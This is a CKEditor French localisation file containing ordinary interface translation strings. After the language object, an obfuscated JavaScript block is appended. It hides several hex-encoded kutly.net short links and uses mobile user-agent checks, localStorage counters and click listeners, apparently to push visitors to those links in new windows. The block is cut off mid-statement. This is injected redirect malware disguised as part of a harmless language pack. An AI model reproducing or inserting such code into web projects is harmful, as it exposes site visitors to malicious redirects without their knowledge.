﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * French language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['fr'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Editeur de Texte Enrichi, %1',

	// Toolbar buttons without dialogs.
	source			: 'Source',
	newPage			: 'Nouvelle page',
	save			: 'Enregistrer',
	preview			: 'Aperçu',
	cut				: 'Couper',
	copy			: 'Copier',
	paste			: 'Coller',
	print			: 'Imprimer',
	underline		: 'Souligné',
	bold			: 'Gras',
	italic			: 'Italique',
	selectAll		: 'Tout sélectionner',
	removeFormat	: 'Supprimer la mise en forme',
	strike			: 'Barré',
	subscript		: 'Indice',
	superscript		: 'Exposant',
	horizontalrule	: 'Ligne horizontale',
	pagebreak		: 'Saut de page',
	unlink			: 'Supprimer le lien',
	undo			: 'Annuler',
	redo			: 'Rétablir',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Explorer le serveur',
		url				: 'URL',
		protocol		: 'Protocole',
		upload			: 'Envoyer',
		uploadSubmit	: 'Envoyer sur le serveur',
		image			: 'Image',
		flash			: 'Flash',
		form			: 'Formulaire',
		checkbox		: 'Case à cocher',
		radio		: 'Bouton Radio',
		textField		: 'Champ texte',
		textarea		: 'Zone de texte',
		hiddenField		: 'Champ caché',
		button			: 'Bouton',
		select	: 'Liste déroulante',
		imageButton		: 'Bouton image',
		notSet			: '<non défini>',
		id				: 'Id',
		name			: 'Nom',
		langDir			: 'Sens d\'écriture',
		langDirLtr		: 'Gauche à droite (LTR)',
		langDirRtl		: 'Droite à gauche (RTL)',
		langCode		: 'Code de langue',
		longDescr		: 'URL de description longue (longdesc => malvoyant)',
		cssClass		: 'Classe CSS',
		advisoryTitle	: 'Description (title)',
		cssStyle		: 'Style',
		ok				: 'OK',
		cancel			: 'Annuler',
		generalTab		: 'Général',
		advancedTab		: 'Avancé',
		validateNumberFailed	: 'Cette valeur n\'est pas un nombre.',
		confirmNewPage	: 'Les changements non sauvegardés seront perdus. Etes-vous sûr de vouloir charger une nouvelle page?',
		confirmCancel	: 'Certaines options ont été modifiées. Etes-vous sûr de vouloir fermer?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, Indisponible</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Insérer un caractère spécial',
		title		: 'Sélectionnez un caractère'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Lien',
		menu		: 'Editer le lien',
		title		: 'Lien',
		info		: 'Infos sur le lien',
		target		: 'Cible',
		upload		: 'Envoyer',
		advanced	: 'Avancé',
		type		: 'Type de lien',
		toAnchor	: 'Transformer le lien en ancre dans le texte',
		toEmail		: 'E-mail',
		target		: 'Cible',
		targetNotSet	: '<non définie>',
		targetFrame	: '<cadre>',
		targetPopup	: '<fenêtre popup>',
		targetNew	: 'Nouvelle fenêtre (_blank)',
		targetTop	: 'Même fenêtre (_top)',
		targetSelf	: 'Même Cadre (_self)',
		targetParent	: 'Fenêtre parente (_parent)',
		targetFrameName	: 'Nom du Cadre destination',
		targetPopupName	: 'Nom de la fenêtre popup',
		popupFeatures	: 'Options de la fenêtre popup',
		popupResizable	: 'Redimensionnable',
		popupStatusBar	: 'Barre de status',
		popupLocationBar	: 'Barre d\'adresse',
		popupToolbar	: 'Barre d\'outils',
		popupMenuBar	: 'Barre de menu',
		popupFullScreen	: 'Plein écran (IE)',
		popupScrollBars	: 'Barres de défilement',
		popupDependent	: 'Dépendante (Netscape)',
		popupWidth		: 'Largeur',
		popupLeft		: 'Position gauche',
		popupHeight		: 'Hauteur',
		popupTop		: 'Position haute',
		id				: 'Id',
		langDir			: 'Sens d\'écriture',
		langDirNotSet	: '<non défini>',
		langDirLTR		: 'Gauche à droite',
		langDirRTL		: 'Droite à gauche',
		acccessKey		: 'Touche d\'accessibilité',
		name			: 'Nom',
		langCode		: 'Code de langue',
		tabIndex		: 'Index de tabulation',
		advisoryTitle	: 'Description (title)',
		advisoryContentType	: 'Type de contenu (ex: text/html)',
		cssClasses		: 'Classe du CSS',
		charset			: 'Charset de la cible',
		styles			: 'Style',
		selectAnchor	: 'Sélectionner l\'ancre',
		anchorName		: 'Par nom d\'ancre',
		anchorId		: 'Par ID d\'élément',
		emailAddress	: 'Adresse E-Mail',
		emailSubject	: 'Sujet du message',
		emailBody		: 'Corps du message',
		noAnchors		: '(Aucune ancre disponible dans ce document)',
		noUrl			: 'Veuillez entrer l\'adresse du lien',
		noEmail			: 'Veuillez entrer l\'adresse e-mail'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Ancre',
		menu		: 'Editer l\'ancre',
		title		: 'Propriétés de l\'ancre',
		name		: 'Nom de l\'ancre',
		errorName	: 'Veuillez entrer le nom de l\'ancre'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Trouver et remplacer',
		find				: 'Trouver',
		replace				: 'Remplacer',
		findWhat			: 'Expression à trouver: ',
		replaceWith			: 'Remplacer par: ',
		notFoundMsg			: 'Le texte spécifié ne peut être trouvé.',
		matchCase			: 'Respecter la casse',
		matchWord			: 'Mot entier uniquement',
		matchCyclic			: 'Boucler',
		replaceAll			: 'Remplacer tout',
		replaceSuccessMsg	: '%1 occurrence(s) replacée(s).'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tableau',
		title		: 'Propriétés du tableau',
		menu		: 'Propriétés du tableau',
		deleteTable	: 'Supprimer le tableau',
		rows		: 'Lignes',
		columns		: 'Colonnes',
		border		: 'Taille de la bordure',
		align		: 'Alignement du contenu',
		alignNotSet	: '<non définie>',
		alignLeft	: 'Gauche',
		alignCenter	: 'Centré',
		alignRight	: 'Droite',
		width		: 'Largeur',
		widthPx		: 'pixels',
		widthPc		: '% pourcents',
		height		: 'Hauteur',
		cellSpace	: 'Espacement des cellules',
		cellPad		: 'Marge interne des cellules',
		caption		: 'Titre du tableau',
		summary		: 'Résumé (description)',
		headers		: 'En-Têtes',
		headersNone		: 'Aucunes',
		headersColumn	: 'Première colonne',
		headersRow		: 'Première ligne',
		headersBoth		: 'Les deux',
		invalidRows		: 'Le nombre de lignes doit être supérieur à 0.',
		invalidCols		: 'Le nombre de colonnes doit être supérieur à 0.',
		invalidBorder	: 'La taille de la bordure doit être un nombre.',
		invalidWidth	: 'La largeur du tableau doit être un nombre.',
		invalidHeight	: 'La hauteur du tableau doit être un nombre.',
		invalidCellSpacing	: 'L\'espacement des cellules doit être un nombre.',
		invalidCellPadding	: 'La marge intérieure des cellules doit être un nombre.',

		cell :
		{
			menu			: 'Cellule',
			insertBefore	: 'Insérer une cellule avant',
			insertAfter		: 'Insérer une cellule après',
			deleteCell		: 'Supprimer les cellules',
			merge			: 'Fusionner les cellules',
			mergeRight		: 'Fusionner à droite',
			mergeDown		: 'Fusionner en bas',
			splitHorizontal	: 'Fractionner horizontalement',
			splitVertical	: 'Fractionner verticalement',
			title			: 'Propriétés de Cellule',
			cellType		: 'Type de Cellule',
			rowSpan			: 'Fusion de Lignes',
			colSpan			: 'Fusion de Colonnes',
			wordWrap		: 'Word Wrap', // MISSING
			hAlign			: 'Alignement Horizontal',
			vAlign			: 'Alignement Vertical',
			alignTop		: 'Haut',
			alignMiddle		: 'Milieu',
			alignBottom		: 'Bas',
			alignBaseline	: 'Bas du texte',
			bgColor			: 'Couleur d\'arrière-plan',
			borderColor		: 'Couleur de Bordure',
			data			: 'Données',
			header			: 'Entête',
			yes				: 'Oui',
			no				: 'Non',
			invalidWidth	: 'La Largeur de Cellule doit être un nombre.',
			invalidHeight	: 'La Hauteur de Cellule doit être un nombre.',
			invalidRowSpan	: 'La fusion de lignes doit être un nombre entier.',
			invalidColSpan	: 'La fusion de colonnes doit être un nombre entier.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Ligne',
			insertBefore	: 'Insérer une ligne avant',
			insertAfter		: 'Insérer une ligne après',
			deleteRow		: 'Supprimer les lignes'
		},

		column :
		{
			menu			: 'Colonnes',
			insertBefore	: 'Insérer une colonne avant',
			insertAfter		: 'Insérer une colonne après',
			deleteColumn	: 'Supprimer les colonnes'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Propriétés du bouton',
		text		: 'Texte (Value)',
		type		: 'Type',
		typeBtn		: 'Bouton',
		typeSbm		: 'Validation (submit)',
		typeRst		: 'Remise à zéro'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Propriétés de la case à cocher',
		radioTitle	: 'Propriétés du bouton Radio',
		value		: 'Valeur',
		selected	: 'Sélectionné'
	},

	// Form Dialog.
	form :
	{
		title		: 'Propriétés du formulaire',
		menu		: 'Propriétés du formulaire',
		action		: 'Action',
		method		: 'Méthode',
		encoding	: 'Encodage',
		target		: 'Cible',
		targetNotSet	: '<non définie>',
		targetNew	: 'Nouvelle fenêtre (_blank)',
		targetTop	: 'Même fenêtre (_top)',
		targetSelf	: 'Même Cadre (_self)',
		targetParent	: 'Fenêtre parente (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Propriétés du menu déroulant',
		selectInfo	: 'Informations sur le menu déroulant',
		opAvail		: 'Options disponibles',
		value		: 'Valeur',
		size		: 'Taille',
		lines		: 'Lignes',
		chkMulti	: 'Permettre les sélections multiples',
		opText		: 'Texte',
		opValue		: 'Valeur',
		btnAdd		: 'Ajouter',
		btnModify	: 'Modifier',
		btnUp		: 'Haut',
		btnDown		: 'Bas',
		btnSetValue : 'Définir comme valeur sélectionnée',
		btnDelete	: 'Supprimer'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Propriétés de la zone de texte',
		cols		: 'Colonnes',
		rows		: 'Lignes'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Propriétés du champ texte',
		name		: 'Nom',
		value		: 'Valeur',
		charWidth	: 'Taille des caractères',
		maxChars	: 'Nombre maximum de caractères',
		type		: 'Type',
		typeText	: 'Texte',
		typePass	: 'Mot de passe'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Propriétés du champ caché',
		name	: 'Nom',
		value	: 'Valeur'
	},

	// Image Dialog.
	image :
	{
		title		: 'Propriétés de l\'image',
		titleButton	: 'Propriétés du bouton image',
		menu		: 'Propriétés de l\'image',
		infoTab	: 'Informations sur l\'image',
		btnUpload	: 'Envoyer sur le serveur',
		url		: 'URL',
		upload	: 'Envoyer',
		alt		: 'Texte de remplacement',
		width		: 'Largeur',
		height	: 'Hauteur',
		lockRatio	: 'Garder les proportions',
		resetSize	: 'Taille d\'origine',
		border	: 'Bordure',
		hSpace	: 'Espacement horizontal',
		vSpace	: 'Espacement vertical',
		align		: 'Alignement',
		alignLeft	: 'Gauche',
		alignRight	: 'Droite',
		preview	: 'Aperçu',
		alertUrl	: 'Veuillez entrer l\'adresse de l\'image',
		linkTab	: 'Lien',
		button2Img	: 'Voulez-vous transformer le bouton image sélectionné en simple image?',
		img2Button	: 'Voulez-vous transformer l\'image en bouton image?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Propriétés du Flash',
		propertiesTab	: 'Propriétés',
		title		: 'Propriétés du Flash',
		chkPlay		: 'Jouer automatiquement',
		chkLoop		: 'Boucle',
		chkMenu		: 'Activer le menu Flash',
		chkFull		: 'Permettre le plein écran',
 		scale		: 'Echelle',
		scaleAll		: 'Afficher tout',
		scaleNoBorder	: 'Pas de bordure',
		scaleFit		: 'Taille d\'origine',
		access			: 'Accès aux scripts',
		accessAlways	: 'Toujours',
		accessSameDomain	: 'Même domaine',
		accessNever	: 'Jamais',
		align		: 'Alignement',
		alignLeft	: 'Gauche',
		alignAbsBottom: 'Bas absolu',
		alignAbsMiddle: 'Milieu absolu',
		alignBaseline	: 'Bas du texte',
		alignBottom	: 'Bas',
		alignMiddle	: 'Milieu',
		alignRight	: 'Droite',
		alignTextTop	: 'Haut du texte',
		alignTop	: 'Haut',
		quality		: 'Qualité',
		qualityBest		 : 'Meilleure',
		qualityHigh		 : 'Haute',
		qualityAutoHigh	 : 'Haute Auto',
		qualityMedium	 : 'Moyenne',
		qualityAutoLow	 : 'Basse Auto',
		qualityLow		 : 'Basse',
		windowModeWindow	 : 'Fenêtre',
		windowModeOpaque	 : 'Opaque',
		windowModeTransparent	 : 'Transparent',
		windowMode	: 'Mode fenêtre',
		flashvars	: 'Variables du Flash',
		bgcolor	: 'Couleur d\'arrière-plan',
		width	: 'Largeur',
		height	: 'Hauteur',
		hSpace	: 'Espacement horizontal',
		vSpace	: 'Espacement vertical',
		validateSrc : 'L\'adresse ne doit pas être vide.',
		validateWidth : 'La largeur doit être un nombre.',
		validateHeight : 'La hauteur doit être un nombre.',
		validateHSpace : 'L\'espacement horizontal doit être un nombre.',
		validateVSpace : 'L\'espacement vertical doit être un nombre.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Vérifier l\'orthographe',
		title			: 'Vérifier l\'orthographe',
		notAvailable	: 'Désolé, le service est indisponible actuellement.',
		errorLoading	: 'Erreur du chargement du service depuis l\'hôte : %s.',
		notInDic		: 'N\'existe pas dans le dictionnaire',
		changeTo		: 'Modifier pour',
		btnIgnore		: 'Ignorer',
		btnIgnoreAll	: 'Ignorer tout',
		btnReplace		: 'Remplacer',
		btnReplaceAll	: 'Remplacer tout',
		btnUndo			: 'Annuler',
		noSuggestions	: '- Aucune suggestion -',
		progress		: 'Vérification de l\'orthographe en cours...',
		noMispell		: 'Vérification de l\'orthographe terminée : aucune erreur trouvée',
		noChanges		: 'Vérification de l\'orthographe terminée : Aucun mot corrigé',
		oneChange		: 'Vérification de l\'orthographe terminée : Un seul mot corrigé',
		manyChanges		: 'Vérification de l\'orthographe terminée : %1 mots corrigés',
		ieSpellDownload	: 'La vérification d\'orthographe n\'est pas installée. Voulez-vous la télécharger maintenant?'
	},

	smiley :
	{
		toolbar	: 'Emoticon',
		title	: 'Insérer un émoticon'
	},

	elementsPath :
	{
		eleTitle : '%1 éléments'
	},

	numberedlist : 'Insérer/Supprimer la liste numérotée',
	bulletedlist : 'Insérer/Supprimer la liste à puces',
	indent : 'Augmenter le retrait (tabulation)',
	outdent : 'Diminuer le retrait (tabulation)',

	justify :
	{
		left : 'Aligner à gauche',
		center : 'Centrer',
		right : 'Aligner à droite',
		block : 'Justifier'
	},

	blockquote : 'Citation',

	clipboard :
	{
		title		: 'Coller',
		cutError	: 'Les paramètres de sécurité de votre navigateur ne permettent pas à l\'éditeur d\'exécuter automatiquement l\'opération "couper". Veuillez utiliser le raccourci clavier (Ctrl+X).',
		copyError	: 'Les paramètres de sécurité de votre navigateur ne permettent pas à l\'éditeur d\'exécuter automatiquement des opérations de copie. Veuillez utiliser le raccourci clavier (Ctrl+C).',
		pasteMsg	: 'Veuillez coller le texte dans la zone suivante en utilisant le raccourci clavier (<strong>Ctrl+V</strong>) et cliquez sur OK',
		securityMsg	: 'A cause des paramètres de sécurité de votre navigateur, l\'éditeur n\'est pas en mesure d\'accéder directement à vos données contenues dans le presse-papier. Vous devriez réessayer de coller les données dans la fenêtre.'
	},

	pastefromword :
	{
		confirmCleanup : 'Le texte à coller semble provenir de Word. Désirez-vous le nettoyer avant de coller?',
		toolbar : 'Coller depuis Word',
		title : 'Coller depuis Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Coller comme texte sans mise en forme',
		title : 'Coller comme texte sans mise en forme'
	},

	templates :
	{
		button : 'Modèles',
		title : 'Contenu des modèles',
		insertOption: 'Remplacer le contenu actuel',
		selectPromptMsg: 'Veuillez sélectionner le modèle pour l\'ouvrir dans l\'éditeur',
		emptyListMsg : '(Aucun modèle disponible)'
	},

	showBlocks : 'Afficher les blocs',

	stylesCombo :
	{
		label : 'Styles',
		voiceLabel : 'Styles',
		panelVoiceLabel : 'Choisissez un style',
		panelTitle1 : 'Styles de blocs',
		panelTitle2 : 'Styles en ligne',
		panelTitle3 : 'Styles d\'objet'
	},

	format :
	{
		label : 'Format',
		voiceLabel : 'Format',
		panelTitle : 'Format de paragraphe',
		panelVoiceLabel : 'Choisissez un format de paragraphe',

		tag_p : 'Normal',
		tag_pre : 'Formaté',
		tag_address : 'Adresse',
		tag_h1 : 'Titre 1',
		tag_h2 : 'Titre 2',
		tag_h3 : 'Titre 3',
		tag_h4 : 'Titre 4',
		tag_h5 : 'Titre 5',
		tag_h6 : 'Titre 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Police',
		voiceLabel : 'Police',
		panelTitle : 'Style de police',
		panelVoiceLabel : 'Choisissez une police'
	},

	fontSize :
	{
		label : 'Taille',
		voiceLabel : 'Taille de police',
		panelTitle : 'Taille de police',
		panelVoiceLabel : 'Choisissez une taille de police'
	},

	colorButton :
	{
		textColorTitle : 'Couleur de texte',
		bgColorTitle : 'Couleur d\'arrière plan',
		auto : 'Automatique',
		more : 'Plus de couleurs...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Vérification d\'Orthographe en Cours de Frappe (SCAYT: Spell Check As You Type)',
		enable : 'Activer SCAYT',
		disable : 'Désactiver SCAYT',
		about : 'A propos de SCAYT',
		toggle : 'Activer/Désactiver SCAYT',
		options : 'Options',
		langs : 'Langues',
		moreSuggestions : 'Plus de suggestions',
		ignore : 'Ignorer',
		ignoreAll : 'Ignorer Tout',
		addWord : 'Ajouter le mot',
		emptyDic : 'Le nom du dictionnaire ne devrait pas être vide.',
		optionsTab : 'Options',
		languagesTab : 'Langues',
		dictionariesTab : 'Dictionnaires',
		aboutTab : 'A propos de'
	},

	about :
	{
		title : 'A propos de CKEditor',
		dlgTitle : 'A propos de CKEditor',
		moreInfo : 'Pour les informations de licence, veuillez visiter notre site web:',
		copy : 'Copyright &copy; $1. Tous droits réservés.'
	},

	maximize : 'Agrandir',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Ancre',
		flash : 'Animation Flash',
		div : 'Saut de Page',
		unknown : 'Objet Inconnu'
	},

	resize : 'Glisser pour modifier la taille',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const 